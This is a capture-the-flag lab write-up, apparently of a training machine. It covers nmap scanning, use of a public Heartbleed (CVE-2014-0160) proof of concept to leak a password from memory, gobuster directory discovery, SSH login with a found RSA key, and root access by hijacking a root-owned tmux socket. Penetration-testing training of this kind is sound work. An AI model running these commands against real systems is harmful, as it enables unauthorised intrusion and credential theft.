<img width="703" height="644" alt="image" src="https://github.com/user-attachments/assets/a1da278b-55fb-451c-873a-da050b9ef119" />

> How many TCP ports are open on the remote host?
> 

### Command Used:

bash

`nmap -sS -p- 10.129.91.223`

<img width="831" height="243" alt="image" src="https://github.com/user-attachments/assets/8dc6c27d-b289-42a2-a209-e1ccd182a9b9" />

answer is `3`

> Which flag is used with nmap to execute its vulnerability discovery scripts (with the category "vuln") on the target?
> 

### Answer: `-script vuln`

### 🔧 Command Used:

bash

`nmap --script vuln -p 443 10.129.91.223`

<img width="826" height="659" alt="image" src="https://github.com/user-attachments/assets/7f8c8069-7f8a-4e41-a562-459f2a21f1b6" />

### 📖 Explanation:

- Runs all scripts in the `vuln` category
- Helps identify CVEs and misconfigurations

> What is the 2014 CVE ID for an information disclosure vulnerability that the service on port 443 is vulnerable to?
> 

<img width="817" height="473" alt="image" src="https://github.com/user-attachments/assets/5feabb61-e144-4977-98ee-d227830dd5da" />

`CVE-2014-0160` is the answer 

> What password can be leaked using HeartBleed (CVE-2014-0160)?
> 

step by step i use to get the password, first i use this tool for 

- Custom PoC script dumps memory
- We carved out the leaked password from the response

`git clone https://github.com/mpgn/heartbleed-PoC
cd heartbleed-PoC`

`python2 [heartbleed-exploit.py](http://heartbleed-exploit.py/) 10.129.91.223 443`

<img width="813" height="247" alt="image" src="https://github.com/user-attachments/assets/06604437-a366-41ca-a109-e0a1f42de510" />

<img width="823" height="582" alt="image" src="https://github.com/user-attachments/assets/31831f3e-1cc6-43bd-b194-54b317f8faa4" />

then i read as strings and found the encryption of b64

<img width="813" height="118" alt="image" src="https://github.com/user-attachments/assets/438f6977-9023-47c1-8457-01d0af41d353" />

grab the encryption and decode it, we got the password

<img width="816" height="83" alt="image" src="https://github.com/user-attachments/assets/45681695-7dd8-47eb-8c8e-bd4402d9ed71" />

`heartbleedbelievethehype`

> What is the relative path of a folder on the website that contains two interesting files, including note.txt?
> 

I use gobuster tool to discover 

<img width="817" height="689" alt="image" src="https://github.com/user-attachments/assets/3ce39a25-3f7f-4804-aba3-0e5955e37857" />

Click the link and you will find the note.txt

<img width="1495" height="255" alt="image" src="https://github.com/user-attachments/assets/ba59da40-9cb1-4153-b6c0-27d90598d336" />

so the answer is 

```php
/dev/
```

> What is the filename of the RSA key found on the website?
> 

Click the hype_key file name

<img width="1497" height="498" alt="image" src="https://github.com/user-attachments/assets/706be9d8-6399-4327-9462-63c32e325efd" />

`hype_key` is the answer 

> Submit the flag located in the hype user's home directory.
> 

### Force Legacy RSA Signature

Let’s explicitly tell your SSH client to use the legacy RSA signature algorithm. Create a temporary config file:

bash

`nano ssh_legacy_config`

Paste this:

Code

`Host 10.129.91.223
    HostName 10.129.91.223
    User hype
    IdentityFile ~/Desktop/tm/heartbleed-PoC/hype_key_decrypted.pem
    PubkeyAcceptedAlgorithms +ssh-rsa
    HostkeyAlgorithms +ssh-rsa`

Save and exit. Then connect using:

bash

`ssh -F ssh_legacy_config 10.129.91.223`

This forces your client to offer the older `ssh-rsa` algorithm, which OpenSSH 5.9 understands.

<img width="826" height="641" alt="image" src="https://github.com/user-attachments/assets/c6516e9b-e001-4f35-9530-496072bbdaed" />

I use quite hard way hahah 

<img width="847" height="39" alt="image" src="https://github.com/user-attachments/assets/5f40835e-d449-4987-9657-6da8a4c20981" />

then you find the flag

> Submit the flag located in root's home directory.
> 

This `ps aux` output shows all running processes on the system

<img width="792" height="665" alt="image" src="https://github.com/user-attachments/assets/26b725e1-af56-40d9-a41a-b2f296124515" />

<img width="845" height="15" alt="image" src="https://github.com/user-attachments/assets/5fc84b61-b382-480b-8fec-d2f292114073" />

That was the **root-owned tmux session** using a custom socket

hijacked it with:

bash

`tmux -S /.devs/dev_sess attach`

That gave you a **root shell**—a perfect example of privilege escalation via **session hijacking**.

<img width="814" height="294" alt="image" src="https://github.com/user-attachments/assets/0b86ac11-01bc-42e8-b346-0319bf4a5efa" />

found the root flag!
